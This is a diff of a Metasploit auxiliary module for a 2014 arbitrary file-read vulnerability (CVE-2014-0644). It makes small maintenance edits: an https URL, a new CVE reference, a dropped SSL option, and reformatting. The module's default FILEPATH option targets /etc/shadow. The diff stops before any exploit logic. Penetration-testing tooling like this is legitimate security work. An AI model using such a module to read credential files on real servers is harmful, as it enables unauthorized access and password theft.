@@ -1,11 +1,9 @@
-# This module requires Metasploit: http://metasploit.com/download
 ##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -23,6 +21,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'References'     =>
         [
+          ['CVE', '2014-0644'],
           ['EDB', '32623']
         ],
       'DisclosureDate' => 'Mar 31 2014'
@@ -32,10 +31,10 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptString.new('SSLVersion', [true, 'SSL version', 'TLS1']),
         OptString.new('TARGETURI', [ true, "Base directory path", '/']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
-      ])
+      ]
+    )
   end
 
   def run
